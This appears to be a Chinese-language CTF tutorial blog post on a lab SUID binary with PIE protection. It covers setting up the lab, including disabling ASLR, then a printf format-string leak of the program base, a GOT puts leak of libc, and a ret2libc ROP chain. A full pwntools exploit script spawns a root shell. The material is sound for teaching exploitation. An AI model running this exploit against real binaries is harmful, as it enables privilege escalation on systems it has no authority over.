# 简介
“pwn"这个词的源起以及它被广泛地普遍使用的原因，源自于魔兽争霸某段讯息上设计师打字时拼错而造成的，原先的字词应该是"own"这个字，因为 ‘p’ 与 ‘o’ 在标准英文键盘上的位置是相邻的，PWN 也是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似"砰”，对黑客而言，这就是成功实施黑客攻击的声音，而在ctf比赛里，pwn是对二进制漏洞的利用

下载这个github库，进入08文件夹
```
https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101
```
还是和上一篇文件一样，设置文件权限，将flag设置位只能root可读
```
chown root:root flag.txt
chmod 700 flag.txt
chown root:root pie_server
```
设置程序位suid位
```
chmod 4655 pie_server
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/4dd82c5d86a64d088230e0847c80aea2.png)
关动态链接库的防护
```
echo 0 > /proc/sys/kernel/randomize_va_space
```


# 获取文件信息
首先我们登录普通用户，然后使用checksec工具可以查看程序更详细的信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/abaaaf66195d40b798a0532a0ccc410a.png)

从上到下依次是
```
64位程序
部分RELRO，基本上所有程序都默认的有这个
没有开启栈保护
启用了数据执行防护，我们不能在堆栈中执行代码
启用了pie防护，程序的内存空间会被随机化
```
查看程序源代码


![在这里插入图片描述](https://img-blog.csdnimg.cn/4410e7c969c249fe831763e09491ddac.png)

```
#include <stdio.h>

void enter_name(){    //enter_name模块
    char name[64];   //定义name变量，缓冲区为64个字符
    puts("Please enter your name:");   //输出字符串
    fgets(name, sizeof(name), stdin);   //获取我们的输入，并存入name变量里
    printf("Hello ");   //输出字符
    printf(name);   //输出我们输入的内容
}

void vuln(){   //vuln模块
    char buffer[256];    //定义buffer变量，缓冲区为256个字符
    gets(buffer);   //获取我们的输入
}

int main()
{
    setuid(0);   //保证程序以root身份运行
    setgid(0);   //保证程序以root身份运行

    enter_name();   //调用enter_name模块

    puts("\nGood luck with your ret2libc, you'll never bypass my new PIE protection OR find out where my lib-c library is :P\n");  //输出字符

    vuln();   //调用vuln模块

    return 0;   //退出程序
}
```
# 动态调试
用gdb打开程序，然后查看程序内调用的函数
```
gdb pie_server 
info functions
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/1a66553deab64685b06b53812a72cdf3.png)


可以看到，这些地址都不是完整的内存地址，都只是偏移量，因为程序开启了PIE防护，它会使程序的内存地址随机化，如果我们要得到一个函数完整的内存地址，就需要用程序的基地址+偏移地址

我们在main函数处下一个断点，然后运行程序
```
break main
run
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/a4fd8d747b1c4df0b05bbd6c3e945b48.png)


可以看到，现在的地址和之前看到的地址完全不同，然后我们输入piebase找到程序的基地址

```
piebase
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/f115879bc38a421ca200377366f36fea.png)
程序的基地址为:
```
0x555555554000
```

有了基地址，我们就可以找到函数完整的内存地址，比如我们要在vuln函数处下一个断点
```
breakrva 0x11d6   //0x11d6：vuln函数的偏移量
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/c521f4e797de41be94d7f8f7da50ed2a.png)

成功打下断点，现在我们删除所有的断点，来测试程序的缓冲区区间
```
delete breakpoints
cyclic 500
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/89feba1fd6c043bf8d9bc826c8e38465.png)

程序的主函数先调用的enter_name模块，然后才是我们需要测试的地方，运行程序，我们随意泄露一些东西看看
```
%p：跳转到指针地址处，输出内容
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/6c592fb4ea8643659f778841359e0bfc.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/4f779ded745a414b85e0411e69767a5a.png)

然后是测试的字符串

![在这里插入图片描述](https://img-blog.csdnimg.cn/a9001a87fe8346f5a28988780a7bfcff.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/9b389df1cecd4f229b55b5e3951869f6.png)

由于在x86架构里，读取地址是由低到高的，所以这里的字符串是qaacraac，这里我们输入前四个字符就好了
```
cyclic -l qaac
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/c5418144e08d433f818658ab5af2d4e2.png)

说明我们要覆盖rip原本的返回地址并控制，就需要264个垃圾字符+想让程序跳转执行的地址


# FUZZ
我们写一个小脚本，和上一篇文章的那个差不多，从堆栈中泄露值
```
exe = './pie_server' 
elf = context.binary = ELF(exe, checksec=False)   //获取程序详细信息
context.log_level = 'warning'   //去除一些不必要的信息，使输出更简洁
for i in range(100):   //测试100个地址
    try:
        p = process('./pie_server')   //启动程序
        p.sendlineafter(b':', '%{}$p'.format(i).encode())   //发送指定的字符串，将第n个指针打印为字符串
        p.recvuntil(b'Hello ')   //获取程序的输出
        result = p.recvline()
        print(str(i) + ': ' + str(result))  //输出
        p.close()   //关闭程序
    except EOFError:
        pass
```

运行程序，我们要找到即使这个脚本运行很多次也不会变的地址

![在这里插入图片描述](https://img-blog.csdnimg.cn/43ce1cea1ab74a46b2f2cd73ce109fa2.png)

可以看到泄露了很多libc库里的地址，第15个看起来是一个内存地址，我们去gdb里看看

![在这里插入图片描述](https://img-blog.csdnimg.cn/59ab9add90bd4bb29c5bffb789c45996.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/d0de8c1e58d14103b635ab3045294e54.png)


我们用这个地址再减去原来这个地址的偏移量就是程序的基地址
```
程序基地址 = 0x0000555555555224 - 0x0000000000001224
```
有了程序的基地址，我们还需要知道libc库的基地址，这个程序调用了puts函数，我们去libc库里找找看
```
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/3f7e94e609a54b958e30e0b88cd4b68c.png)

这里有很多puts函数的偏移量，之后写脚本一个一个用泄露的puts地址减去这个偏移地址就是libc库的基地址

# pwntools
然后我们要找到pop rdi指令地址和system函数地址以及/bin/sh字符地址
```
ropper --file pie_server --search "pop rdi"
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/18247d20df424c5db93414bf099fcbed.png)

我们只得到了这个指令的偏移地址，我们将程序的基地址 + 这个偏移地址，就是完整的内存地址

```
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts   //获取libc库里的puts函数地址，之后计算libc基地址
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/813b36d4b31a42ee914788d7577f6c96.png)

这些都是偏移地址，我们需要加上libc的基地址才行

然后我们就可以开始写脚本了
```
from pwn import *

exe = './pie_server'
elf = context.binary = ELF(exe, checksec=False)  //自动获取程序的详细信息

offset = 264  //覆盖程序返回地址的垃圾字符数
io = process("./pie_server")  //启动程序

pop_rdi_offset = 0x12ab   //rdi的偏移地址，我们要找到程序的基地址才能用

io.sendlineafter(b':', '%{}$p'.format(15))  //获取我们刚刚fuzz泄露的第15个不会变的内存地址
io.recvuntil(b'Hello ')  //获取程序输出的字符Hello
leaked_addr = int(io.recvline(), 16)   //将泄露的地址以整数形式存入leaked_addr变量中

elf.address = leaked_addr - 0x1224  //计算程序的基地址
pop_rdi = elf.address + pop_rdi_offset  //获得pop rdi指令真实的内存地址

//现在我们要泄漏 libc 函数，方便之后计算libc库的基地址
payload = flat({
    offset: [   //覆盖程序返回地址的垃圾字符数
        pop_rdi,  //将got.puts存入rdi寄存器里
        elf.got.puts,  //将got.puts存入rdi寄存器里
        elf.plt.puts,  //调用 puts() 泄露 got.puts 地址
        elf.symbols.vuln  //返回到vuln函数地址，接下来我们要缓冲区溢出获取shell
    ]
})

io.sendlineafter(b':P', payload)  //发送payload

io.recvlines(2)  //接收程序两次输出

got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))  //获取 got.puts 地址
info("leaked got_puts: %#x", got_puts)  //输出libc泄露的puts函数地址
libc_base = got_puts - 0x76140   //计算libc库的基地址

system_addr = libc_base + 0x4a4e0   //计算system函数真实地址
bin_sh = libc_base + 0x1b1117   //计算/bin/sh地址真实地址

payload = flat({   //完整的payload
    offset: [
        pop_rdi,
        bin_sh,
        system_addr
    ]
})
io.sendline(payload) 发送paylaod
io.interactive()  //获得交互
```
运行脚本，成功得到flag


![在这里插入图片描述](https://img-blog.csdnimg.cn/7c7c9f77d00a4d7e872edef35052c6b6.png)



